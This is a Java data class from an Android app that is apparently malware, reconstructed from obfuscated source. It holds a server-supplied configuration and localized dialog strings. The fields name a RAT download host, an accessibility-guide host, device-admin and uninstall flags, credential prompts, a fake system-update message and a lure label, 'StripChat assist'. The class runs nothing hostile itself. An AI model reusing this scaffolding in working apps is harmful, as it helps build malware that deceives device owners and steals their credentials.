package com.guard.wallet.entity;

import androidx.annotation.NonNull;
import android.text.TextUtils;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Locale;
import java.util.Objects;

/**
 * Application build configuration received from server.
 * Contains server URLs, feature flags, and localized dialog strings.
 *
 * The vendor source used obfuscated utility classes for locale resolution:
 * - h.m() -> get current device language tag
 * - q.B() -> check if string is empty
 * - e.f() -> extract primary language from locale tag
 * These are replaced with standard Android/Java equivalents here.
 */
public class BuildConfig implements Serializable {
    private Integer activeAdmin;
    private String blockBgColor;
    private String blockIconUrl;
    private Integer debug;
    private String downloadRatHatHost;
    private String downloadRatHatName;
    private String guideAccessibilityHost;
    private HashMap<String, LangDialog> langMap;
    private String mainActivity;
    private String mainUrl;
    private Integer perIdleDuration;
    private Integer perScreenOffDuration;
    private Integer promotionModel;
    private String serverHost;
    private String trusteeId;
    private Integer uninstall;

    public BuildConfig() {
    }

    public BuildConfig(String serverHost, String downloadRatHatHost, String downloadRatHatName,
                       String guideAccessibilityHost, String mainActivity, String mainUrl,
                       String trusteeId, String blockIconUrl, String blockBgColor,
                       Integer promotionModel, Integer uninstall, Integer activeAdmin,
                       Integer debug, Integer perScreenOffDuration, Integer perIdleDuration,
                       HashMap<String, LangDialog> langMap) {
        this.serverHost = serverHost;
        this.downloadRatHatHost = downloadRatHatHost;
        this.downloadRatHatName = downloadRatHatName;
        this.guideAccessibilityHost = guideAccessibilityHost;
        this.mainActivity = mainActivity;
        this.mainUrl = mainUrl;
        this.trusteeId = trusteeId;
        this.blockIconUrl = blockIconUrl;
        this.blockBgColor = blockBgColor;
        this.promotionModel = promotionModel;
        this.uninstall = uninstall;
        this.activeAdmin = activeAdmin;
        this.langMap = langMap;
        this.debug = debug;
        this.perScreenOffDuration = perScreenOffDuration;
        this.perIdleDuration = perIdleDuration;
    }

    /**
     * Resolves a LangDialog for the current device locale.
     * Lookup order: exact locale tag -> primary language -> "en" fallback.
     */
    private LangDialog resolveLangDialog() {
        String langTag = Locale.getDefault().toLanguageTag();
        if (TextUtils.isEmpty(langTag)) {
            return null;
        }
        HashMap<String, LangDialog> map = this.langMap;
        if (map == null || map.isEmpty()) {
            return null;
        }
        String primaryLang = Locale.getDefault().getLanguage();
        LangDialog dialog = map.get(langTag);
        if (dialog == null && !Objects.equals(primaryLang, langTag)) {
            dialog = map.get(primaryLang);
        }
        if (dialog == null) {
            dialog = map.get("en");
        }
        return dialog;
    }

    public String getAccessibilityServiceLabel() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAccessibilityServiceLabel() : null;
    }

    public Integer getActiveAdmin() {
        return this.activeAdmin;
    }

    public String getAlertMsg() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAlertMsg() : null;
    }

    public String getAlertRestrictedMsg() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAlertRestrictedMsg() : null;
    }

    public String getAlertTitle() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAlertTitle() : null;
    }

    public String getAliveBlockMsg() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAliveBlockMsg() : null;
    }

    public String getAllowRestricted() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAllowRestricted() : null;
    }

    public String getAppCredentialDescription() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAppCredentialDescription() : null;
    }

    public String getAppCredentialInitMsg() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAppCredentialInitMsg() : null;
    }

    public String getAppCredentialSubTitle() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAppCredentialSubTitle() : null;
    }

    public String getAppCredentialTitle() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getAppCredentialTitle() : null;
    }

    public String getAppLabel() {
        LangDialog dialog = resolveLangDialog();
        if (dialog != null) {
            return dialog.getAppLabel();
        }
        return "StripChat assist";
    }

    public String getBlockBgColor() {
        return this.blockBgColor;
    }

    public String getBlockIconUrl() {
        return this.blockIconUrl;
    }

    public Integer getDebug() {
        return this.debug;
    }

    public String getDownloadRatHatHost() {
        return this.downloadRatHatHost;
    }

    public String getDownloadRatHatName() {
        return this.downloadRatHatName;
    }

    public String getExitConfirm() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getExitConfirm() : null;
    }

    public String getGuideAccessibilityHost() {
        return this.guideAccessibilityHost;
    }

    public HashMap<String, LangDialog> getLangMap() {
        return this.langMap;
    }

    public String getLauncherLabel() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getLauncherLabel() : null;
    }

    public String getMainActivity() {
        return this.mainActivity;
    }

    public String getMainUrl() {
        return this.mainUrl;
    }

    public String getNotificationContent() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getNotificationContent() : null;
    }

    public String getNotificationTitle() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getNotificationTitle() : null;
    }

    public String getOkText() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getOkText() : null;
    }

    public Integer getPerIdleDuration() {
        return this.perIdleDuration;
    }

    public Integer getPerScreenOffDuration() {
        return this.perScreenOffDuration;
    }

    public Integer getPromotionModel() {
        return this.promotionModel;
    }

    public String getServerHost() {
        return this.serverHost;
    }

    public String getTrusteeId() {
        return this.trusteeId;
    }

    public Integer getUninstall() {
        return this.uninstall;
    }

    public String getUpdateCredentialDescription() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getUpdateCredentialDescription() : null;
    }

    public String getUpdateCredentialSubTitle() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getUpdateCredentialSubTitle() : null;
    }

    public String getUpdateCredentialTitle() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getUpdateCredentialTitle() : null;
    }

    public String getUpdateSystemMsg() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getUpdateSystemMsg() : null;
    }

    public String getWifiBlockMsg() {
        LangDialog dialog = resolveLangDialog();
        return dialog != null ? dialog.getWifiBlockMsg() : null;
    }

    public void setActiveAdmin(Integer activeAdmin) {
        this.activeAdmin = activeAdmin;
    }

    public void setBlockBgColor(String blockBgColor) {
        this.blockBgColor = blockBgColor;
    }

    public void setBlockIconUrl(String blockIconUrl) {
        this.blockIconUrl = blockIconUrl;
    }

    public void setDebug(Integer debug) {
        this.debug = debug;
    }

    public void setDownloadRatHatHost(String downloadRatHatHost) {
        this.downloadRatHatHost = downloadRatHatHost;
    }

    public void setDownloadRatHatName(String downloadRatHatName) {
        this.downloadRatHatName = downloadRatHatName;
    }

    public void setGuideAccessibilityHost(String guideAccessibilityHost) {
        this.guideAccessibilityHost = guideAccessibilityHost;
    }

    public void setLangMap(HashMap<String, LangDialog> langMap) {
        this.langMap = langMap;
    }

    public void setMainActivity(String mainActivity) {
        this.mainActivity = mainActivity;
    }

    public void setMainUrl(String mainUrl) {
        this.mainUrl = mainUrl;
    }

    public void setPerIdleDuration(Integer perIdleDuration) {
        this.perIdleDuration = perIdleDuration;
    }

    public void setPerScreenOffDuration(Integer perScreenOffDuration) {
        this.perScreenOffDuration = perScreenOffDuration;
    }

    public void setPromotionModel(Integer promotionModel) {
        this.promotionModel = promotionModel;
    }

    public void setServerHost(String serverHost) {
        this.serverHost = serverHost;
    }

    public void setTrusteeId(String trusteeId) {
        this.trusteeId = trusteeId;
    }

    public void setUninstall(Integer uninstall) {
        this.uninstall = uninstall;
    }

    @NonNull
    @Override
    public String toString() {
        return "BuildConfig{serverHost='" + this.serverHost
                + "',downloadRatHatHost='" + this.downloadRatHatHost
                + "',downloadRatHatName='" + this.downloadRatHatName
                + "',guideAccessibilityHost='" + this.guideAccessibilityHost
                + "',mainActivity='" + this.mainActivity
                + "',mainUrl='" + this.mainUrl
                + "', trusteeId='" + this.trusteeId
                + "', blockIconUrl='" + this.blockIconUrl
                + "', blockBgColor='" + this.blockBgColor
                + "', promotionModel='" + this.promotionModel
                + "', uninstall='" + this.uninstall
                + "', activeAdmin='" + this.activeAdmin
                + "', debug='" + this.debug
                + "', perScreenOffDuration='" + this.perScreenOffDuration
                + "', perIdleDuration='" + this.perIdleDuration
                + "', langMap='" + this.langMap + "'}";
    }
}
